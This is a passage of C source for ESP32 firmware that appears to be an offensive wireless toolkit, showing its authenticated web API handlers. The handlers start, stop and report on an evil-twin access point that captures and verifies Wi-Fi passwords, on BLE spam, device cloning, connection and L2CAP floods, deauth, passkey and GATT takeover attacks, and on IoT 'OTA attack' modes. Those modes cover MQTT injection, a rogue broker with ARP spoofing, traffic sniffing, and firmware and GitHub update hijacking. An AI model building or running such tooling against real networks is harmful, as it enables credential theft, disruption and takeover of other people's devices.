    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    attack_eviltwin_stop();
    return send_success_response(req);
}

static esp_err_t eviltwin_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, attack_eviltwin_get_status_json());
    return ESP_OK;
}

static esp_err_t eviltwin_passwords_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    eviltwin_password_entry_t entries[EVILTWIN_MAX_PASSWORDS];
    int count = 0;
    attack_eviltwin_get_captured_passwords(entries, EVILTWIN_MAX_PASSWORDS, &count);

    eviltwin_status_t st;
    attack_eviltwin_get_status(&st);

    cJSON *root = cJSON_CreateObject();
    if (root == NULL) {
        return send_json_response(req, root);
    }

    cJSON *pw_array = cJSON_CreateArray();
    if (pw_array == NULL) {
        cJSON_Delete(root);
        return send_json_response(req, NULL);
    }

    for (int i = 0; i < count; i++) {
        cJSON *entry = cJSON_CreateObject();
        if (entry == NULL) continue;
        cJSON_AddStringToObject(entry, "password", entries[i].password);
        cJSON_AddBoolToObject(entry, "verified", entries[i].verified);
        cJSON_AddNumberToObject(entry, "attempt_count", entries[i].attempt_count);
        cJSON_AddItemToArray(pw_array, entry);
    }

    cJSON_AddItemToObject(root, "passwords", pw_array);
    cJSON_AddNumberToObject(root, "total", count);
    if (st.password_verified) {
        cJSON_AddStringToObject(root, "verified_password", st.verified_password);
    }

    esp_err_t err = send_json_response(req, root);
    return err;
}

static esp_err_t eviltwin_clear_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    attack_eviltwin_clear_passwords();
    return send_success_response(req);
}

/* ================================================================== */
/*  BLE HANDLERS                                                       */
/* ================================================================== */

static esp_err_t ble_spam_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;

    cJSON *device_type_json = cJSON_GetObjectItem(root, "device_type");
    cJSON *delay_json = cJSON_GetObjectItem(root, "delay_ms");

    if (!cJSON_IsNumber(device_type_json) || !cJSON_IsNumber(delay_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "device_type and delay_ms are required");
        return ESP_FAIL;
    }

    int device_type = device_type_json->valueint;
    int delay_ms = delay_json->valueint;

    if (device_type < 1 || device_type > 25) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "device_type must be between 1 and 25");
        return ESP_FAIL;
    }
    if (delay_ms < 0 || delay_ms > 2000) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "delay_ms must be between 0 and 2000");
        return ESP_FAIL;
    }

    attack_bt_spam_init();

    bt_spam_config_t config = {0};
    config.device_type = device_type;
    config.delay_ms = delay_ms;
    attack_bt_spam_start(&config);

    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_spam_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    attack_bt_spam_stop();
    return send_success_response(req);
}

static esp_err_t ble_spam_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = attack_bt_spam_get_status_json();
    return send_json_response(req, status);
}

static esp_err_t ble_spoof_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *name = cJSON_GetObjectItem(root, "name");
    const char *sname = cJSON_IsString(name) ? name->valuestring : NULL;
    ble_spoof_start(sname);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_spoof_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_spoof_stop();
    return send_success_response(req);
}

static esp_err_t ble_spoof_clone_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[512];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *adv_data_json    = cJSON_GetObjectItem(root, "adv_data");
    cJSON *name_json        = cJSON_GetObjectItem(root, "name");
    cJSON *custom_name_json = cJSON_GetObjectItem(root, "custom_name");
    cJSON *addr_json        = cJSON_GetObjectItem(root, "addr");
    cJSON *clone_opt_json   = cJSON_GetObjectItem(root, "clone_opt");

    const char *device_name  = cJSON_IsString(name_json) ? name_json->valuestring : NULL;
    const char *custom_name  = cJSON_IsString(custom_name_json) ? custom_name_json->valuestring : NULL;
    const char *addr_str     = cJSON_IsString(addr_json) ? addr_json->valuestring : NULL;
    const char *adv_hex      = cJSON_IsString(adv_data_json) ? adv_data_json->valuestring : NULL;
    const char *clone_opt    = cJSON_IsString(clone_opt_json) ? clone_opt_json->valuestring : "full";

    ESP_LOGI(TAG, "BLE clone request: name='%s' addr='%s' adv=%s custom='%s' opt=%s",
             device_name ? device_name : "(null)",
             addr_str ? addr_str : "(null)",
             adv_hex ? "provided" : "none",
             custom_name ? custom_name : "(null)",
             clone_opt);

    if (adv_hex != NULL && strlen(adv_hex) > 0) {
        size_t hex_len = strlen(adv_hex);
        if (hex_len % 2 != 0 || hex_len / 2 > 31) {
            cJSON_Delete(root);
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST,
                                "adv_data must be even-length hex, max 62 chars (31 bytes)");
            return ESP_FAIL;
        }

        uint8_t raw_adv[31];
        size_t  raw_len = hex_len / 2;
        for (size_t i = 0; i < raw_len; i++) {
            unsigned int byte;
            if (sscanf(adv_hex + i * 2, "%02x", &byte) != 1) {
                cJSON_Delete(root);
                httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST,
                                    "adv_data contains invalid hex");
                return ESP_FAIL;
            }
            raw_adv[i] = (uint8_t)byte;
        }

        ble_spoof_clone_profile_t profile;
        memset(&profile, 0, sizeof(profile));
        ble_spoof_parse_adv(raw_adv, (uint8_t)raw_len, &profile);

        memcpy(profile.raw_adv, raw_adv, raw_len);
        profile.raw_adv_len = (uint8_t)raw_len;

        if (strcmp(clone_opt, "nameonly") == 0) {
            profile.svc_uuids_16_count = 0;
            profile.svc_uuids_128_count = 0;
            profile.has_appearance = false;
            profile.has_tx_power = false;
            profile.has_mfr_data = false;
            profile.raw_adv_len = 0;
        } else if (strcmp(clone_opt, "stealth") == 0) {
            profile.name[0] = '\0';
            profile.raw_adv_len = 0;
        }

        if (custom_name && strlen(custom_name) > 0) {
            strncpy(profile.name, custom_name, BLE_SPOOF_MAX_NAME_LEN);
            profile.name[BLE_SPOOF_MAX_NAME_LEN] = '\0';
            profile.raw_adv_len = 0;
        }

        ble_spoof_clone_start(&profile);

    } else if (device_name != NULL || custom_name != NULL) {
        ble_spoof_clone_profile_t profile;
        memset(&profile, 0, sizeof(profile));
        const char *use_name = (custom_name && strlen(custom_name) > 0)
                                ? custom_name : device_name;
        if (use_name) {
            strncpy(profile.name, use_name, BLE_SPOOF_MAX_NAME_LEN);
            profile.name[BLE_SPOOF_MAX_NAME_LEN] = '\0';
        }
        profile.flags = 0x06;
        ble_spoof_clone_start(&profile);

    } else {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST,
                            "Provide at least 'name', 'adv_data', or 'custom_name'");
        return ESP_FAIL;
    }

    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_connect_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_connect_flood_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_connect_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_connect_flood_stop();
    return send_success_response(req);
}

static esp_err_t ble_l2cap_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_l2cap_flood_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_l2cap_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_l2cap_flood_stop();
    return send_success_response(req);
}

static esp_err_t ble_l2cap_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    cJSON *status = ble_l2cap_flood_get_status_json();
    return send_json_response(req, status);
}

static esp_err_t ble_gatt_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_gatt_probe_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_gatt_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_gatt_probe_stop();
    return send_success_response(req);
}

static esp_err_t ble_deauth_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_deauth_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_deauth_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_deauth_stop();
    return send_success_response(req);
}

static esp_err_t ble_deauth_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    cJSON *status = ble_deauth_get_status_json();
    return send_json_response(req, status);
}

static esp_err_t ble_scan_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *result = ble_scan_perform(5000);
    if (result == NULL) result = cJSON_CreateArray();
    return send_json_response(req, result);
}

static esp_err_t ble_status_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *response = cJSON_CreateObject();
    if (response == NULL) {
        return send_json_response(req, response);
    }
    cJSON_AddBoolToObject(response, "running", attack_bt_spam_is_running());
    return send_json_response(req, response);
}

/* ---- BLE Passkey Handlers ---- */

static esp_err_t ble_passkey_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_passkey_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_passkey_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_passkey_stop();
    return send_success_response(req);
}

static esp_err_t ble_passkey_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    cJSON *pk_root = cJSON_CreateObject();
    cJSON_AddBoolToObject(pk_root, "running", ble_passkey_is_running());
    cJSON_AddStringToObject(pk_root, "method", ble_passkey_get_method());
    char *pk_json = cJSON_PrintUnformatted(pk_root);
    httpd_resp_sendstr(req, pk_json);
    free(pk_json);
    cJSON_Delete(pk_root);
    return ESP_OK;
}

/* ---- BLE Takeover Handlers ---- */

static esp_err_t ble_takeover_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_takeover_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_takeover_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_takeover_stop();
    return send_success_response(req);
}

static esp_err_t ble_takeover_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    cJSON *to_root = cJSON_CreateObject();
    cJSON_AddBoolToObject(to_root, "running", ble_takeover_is_running());
    cJSON_AddNumberToObject(to_root, "state", ble_takeover_get_state());
    char *to_json = cJSON_PrintUnformatted(to_root);
    httpd_resp_sendstr(req, to_json);
    free(to_json);
    cJSON_Delete(to_root);
    return ESP_OK;
}

static esp_err_t ble_takeover_services_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ble_takeover_get_services_json());
    return ESP_OK;
}

static esp_err_t ble_takeover_read_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[128];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *handle_json = cJSON_GetObjectItem(root, "handle");
    if (!cJSON_IsNumber(handle_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing handle");
        return ESP_FAIL;
    }
    ble_takeover_read_chr((uint16_t)handle_json->valueint);
    cJSON_Delete(root);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ble_takeover_get_read_result());
    return ESP_OK;
}

static esp_err_t ble_takeover_write_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[512];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *handle_json = cJSON_GetObjectItem(root, "handle");
    cJSON *value_json = cJSON_GetObjectItem(root, "value");
    if (!cJSON_IsNumber(handle_json) || !cJSON_IsString(value_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing handle or value");
        return ESP_FAIL;
    }
    bool ok = ble_takeover_write_chr((uint16_t)handle_json->valueint, value_json->valuestring);
    cJSON_Delete(root);
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    return send_json_response(req, resp);
}

static esp_err_t ble_takeover_notify_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[128];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *handle_json = cJSON_GetObjectItem(root, "handle");
    cJSON *enable_json = cJSON_GetObjectItem(root, "enable");
    if (!cJSON_IsNumber(handle_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing handle");
        return ESP_FAIL;
    }
    bool enable = cJSON_IsBool(enable_json) ? enable_json->valueint : true;
    bool ok = ble_takeover_enable_notify((uint16_t)handle_json->valueint, enable);
    cJSON_Delete(root);
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    return send_json_response(req, resp);
}

static esp_err_t ble_takeover_notifs_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ble_takeover_get_notifications_json());
    return ESP_OK;
}

/* ================================================================== */
/*  OTA ATTACK HANDLERS                                                */
/* ================================================================== */

static esp_err_t ota_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[1024];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    ota_attack_config_t cfg = {0};

    cJSON *mode_json = cJSON_GetObjectItem(root, "mode");
    if (!cJSON_IsNumber(mode_json) || mode_json->valueint < 0 || mode_json->valueint > 8) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid or missing mode (0-8)");
        return ESP_FAIL;
    }
    cfg.mode = (ota_attack_mode_t)mode_json->valueint;

    /* WiFi credentials */
    cJSON *ssid_json = cJSON_GetObjectItem(root, "wifi_ssid");
    cJSON *pass_json = cJSON_GetObjectItem(root, "wifi_password");
    if (cJSON_IsString(ssid_json)) {
        strncpy(cfg.wifi_ssid, ssid_json->valuestring, sizeof(cfg.wifi_ssid) - 1);
    }
    if (cJSON_IsString(pass_json)) {
        strncpy(cfg.wifi_password, pass_json->valuestring, sizeof(cfg.wifi_password) - 1);
    }

    /* MQTT broker */
    cJSON *broker_json = cJSON_GetObjectItem(root, "mqtt_broker");
    cJSON *port_json   = cJSON_GetObjectItem(root, "mqtt_port");
    cJSON *muser_json  = cJSON_GetObjectItem(root, "mqtt_username");
    cJSON *mpass_json  = cJSON_GetObjectItem(root, "mqtt_password");
    cJSON *cid_json    = cJSON_GetObjectItem(root, "mqtt_client_id");
    cJSON *sub_json    = cJSON_GetObjectItem(root, "subscribe_topic");
    if (cJSON_IsString(broker_json)) strncpy(cfg.mqtt_broker, broker_json->valuestring, sizeof(cfg.mqtt_broker) - 1);
    cfg.mqtt_port = cJSON_IsNumber(port_json) ? (uint16_t)port_json->valueint : 1883;
    if (cJSON_IsString(muser_json)) strncpy(cfg.mqtt_username, muser_json->valuestring, sizeof(cfg.mqtt_username) - 1);
    if (cJSON_IsString(mpass_json)) strncpy(cfg.mqtt_password, mpass_json->valuestring, sizeof(cfg.mqtt_password) - 1);
    if (cJSON_IsString(cid_json)) strncpy(cfg.mqtt_client_id, cid_json->valuestring, sizeof(cfg.mqtt_client_id) - 1);
    if (cJSON_IsString(sub_json)) strncpy(cfg.subscribe_topic, sub_json->valuestring, sizeof(cfg.subscribe_topic) - 1);

    /* Injection */
    cJSON *itopic_json   = cJSON_GetObjectItem(root, "inject_topic");
    cJSON *ipayload_json = cJSON_GetObjectItem(root, "inject_payload");
    cJSON *icount_json   = cJSON_GetObjectItem(root, "inject_count");
    cJSON *iinterval_json = cJSON_GetObjectItem(root, "inject_interval_ms");
    if (cJSON_IsString(itopic_json)) strncpy(cfg.inject_topic, itopic_json->valuestring, sizeof(cfg.inject_topic) - 1);
    if (cJSON_IsString(ipayload_json)) strncpy(cfg.inject_payload, ipayload_json->valuestring, sizeof(cfg.inject_payload) - 1);
    cfg.inject_count = cJSON_IsNumber(icount_json) ? (uint32_t)icount_json->valueint : 1;
    cfg.inject_interval_ms = cJSON_IsNumber(iinterval_json) ? (uint32_t)iinterval_json->valueint : 0;

    /* Firmware fetch */
    cJSON *fw_url_json = cJSON_GetObjectItem(root, "firmware_url");
    cJSON *ssl_json    = cJSON_GetObjectItem(root, "verify_ssl");
    if (cJSON_IsString(fw_url_json)) strncpy(cfg.firmware_url, fw_url_json->valuestring, sizeof(cfg.firmware_url) - 1);
    cfg.verify_ssl = cJSON_IsBool(ssl_json) ? ssl_json->valueint : false;

    /* Poll sniff */
    cJSON *cap_dns_json  = cJSON_GetObjectItem(root, "capture_dns");
    cJSON *cap_http_json = cJSON_GetObjectItem(root, "capture_http");
    cfg.capture_dns  = cJSON_IsBool(cap_dns_json)  ? cap_dns_json->valueint  : true;
    cfg.capture_http = cJSON_IsBool(cap_http_json) ? cap_http_json->valueint : true;

    /* GitHub takeover */
    cJSON *gh_path_json = cJSON_GetObjectItem(root, "gh_firmware_path");
    cJSON *gh_branch_json = cJSON_GetObjectItem(root, "gh_branch");
    cJSON *gh_msg_json  = cJSON_GetObjectItem(root, "gh_commit_msg");
    cJSON *gh_idx_json  = cJSON_GetObjectItem(root, "gh_captured_url_index");
    if (cJSON_IsString(gh_path_json)) strncpy(cfg.gh_firmware_path, gh_path_json->valuestring, sizeof(cfg.gh_firmware_path) - 1);
    if (cJSON_IsString(gh_branch_json)) strncpy(cfg.gh_branch, gh_branch_json->valuestring, sizeof(cfg.gh_branch) - 1);
    if (cJSON_IsString(gh_msg_json)) strncpy(cfg.gh_commit_msg, gh_msg_json->valuestring, sizeof(cfg.gh_commit_msg) - 1);
    cfg.gh_captured_url_index = cJSON_IsNumber(gh_idx_json) ? gh_idx_json->valueint : -1;

    /* General */
    cJSON *timeout_json = cJSON_GetObjectItem(root, "timeout_sec");
    cJSON *devip_json      = cJSON_GetObjectItem(root, "target_device_ip");
    cJSON *capdns_json     = cJSON_GetObjectItem(root, "capture_dns");
    cJSON *caphttp_json    = cJSON_GetObjectItem(root, "capture_http");
    cJSON *ghpath_json     = cJSON_GetObjectItem(root, "gh_firmware_path");
    cJSON *ghbranch_json   = cJSON_GetObjectItem(root, "gh_branch");
    cJSON *ghcommit_json   = cJSON_GetObjectItem(root, "gh_commit_msg");
    cJSON *ghidx_json      = cJSON_GetObjectItem(root, "gh_captured_url_index");
    cfg.timeout_sec = cJSON_IsNumber(timeout_json) ? (uint32_t)timeout_json->valueint : 300;
    if (cJSON_IsArray(devip_json) && cJSON_GetArraySize(devip_json) == 4) {
        for (int i = 0; i < 4; i++) {
            cJSON *byte = cJSON_GetArrayItem(devip_json, i);
            if (cJSON_IsNumber(byte)) cfg.target_device_ip[i] = (uint8_t)byte->valueint;
        }
    }
    if (cJSON_IsBool(capdns_json)) cfg.capture_dns = capdns_json->valueint;
    if (cJSON_IsBool(caphttp_json)) cfg.capture_http = caphttp_json->valueint;
    if (cJSON_IsString(ghpath_json)) strncpy(cfg.gh_firmware_path, ghpath_json->valuestring, sizeof(cfg.gh_firmware_path) - 1);
    if (cJSON_IsString(ghbranch_json)) strncpy(cfg.gh_branch, ghbranch_json->valuestring, sizeof(cfg.gh_branch) - 1);
    if (cJSON_IsString(ghcommit_json)) strncpy(cfg.gh_commit_msg, ghcommit_json->valuestring, sizeof(cfg.gh_commit_msg) - 1);
    if (cJSON_IsNumber(ghidx_json)) cfg.gh_captured_url_index = ghidx_json->valueint;

    /* Provision sniff config */
    cJSON *prov_port_json     = cJSON_GetObjectItem(root, "prov_sniff_port");
    cJSON *prov_post_only_json = cJSON_GetObjectItem(root, "prov_capture_post_only");
    cJSON *prov_auto_json     = cJSON_GetObjectItem(root, "prov_auto_parse_json");
    cfg.prov_sniff_port       = cJSON_IsNumber(prov_port_json) ? (uint16_t)prov_port_json->valueint : 80;
    cfg.prov_capture_post_only = cJSON_IsBool(prov_post_only_json) ? prov_post_only_json->valueint : true;
    cfg.prov_auto_parse_json  = cJSON_IsBool(prov_auto_json) ? prov_auto_json->valueint : true;

    /* Rogue broker config */
    cJSON *rb_port_json       = cJSON_GetObjectItem(root, "rb_rogue_port");
    cJSON *rb_broker_json     = cJSON_GetObjectItem(root, "rb_real_broker_ip");
    cJSON *rb_bport_json      = cJSON_GetObjectItem(root, "rb_real_broker_port");
    cJSON *rb_modify_json     = cJSON_GetObjectItem(root, "rb_modify_payloads");
    cJSON *rb_mtopic_json     = cJSON_GetObjectItem(root, "rb_modify_topic");
    cJSON *rb_mpayload_json   = cJSON_GetObjectItem(root, "rb_modify_payload");
    cJSON *rb_arp_json        = cJSON_GetObjectItem(root, "rb_arp_spoof");
    cfg.rb_rogue_port         = cJSON_IsNumber(rb_port_json) ? (uint16_t)rb_port_json->valueint : 1883;
    if (cJSON_IsString(rb_broker_json)) strncpy(cfg.rb_real_broker_ip, rb_broker_json->valuestring, sizeof(cfg.rb_real_broker_ip) - 1);
    cfg.rb_real_broker_port   = cJSON_IsNumber(rb_bport_json) ? (uint16_t)rb_bport_json->valueint : 1883;
    cfg.rb_modify_payloads    = cJSON_IsBool(rb_modify_json) ? rb_modify_json->valueint : false;
    if (cJSON_IsString(rb_mtopic_json)) strncpy(cfg.rb_modify_topic, rb_mtopic_json->valuestring, sizeof(cfg.rb_modify_topic) - 1);
    if (cJSON_IsString(rb_mpayload_json)) strncpy(cfg.rb_modify_payload, rb_mpayload_json->valuestring, sizeof(cfg.rb_modify_payload) - 1);
    cfg.rb_arp_spoof          = cJSON_IsBool(rb_arp_json) ? rb_arp_json->valueint : true;

    /* Firmware analysis config */
    cJSON *fw_idx_json        = cJSON_GetObjectItem(root, "fw_analyze_url_index");
    cJSON *fw_deep_json       = cJSON_GetObjectItem(root, "fw_deep_scan");
    cJSON *fw_strings_json    = cJSON_GetObjectItem(root, "fw_extract_strings");
    cfg.fw_analyze_url_index  = cJSON_IsNumber(fw_idx_json) ? fw_idx_json->valueint : -1;
    cfg.fw_deep_scan          = cJSON_IsBool(fw_deep_json) ? fw_deep_json->valueint : true;
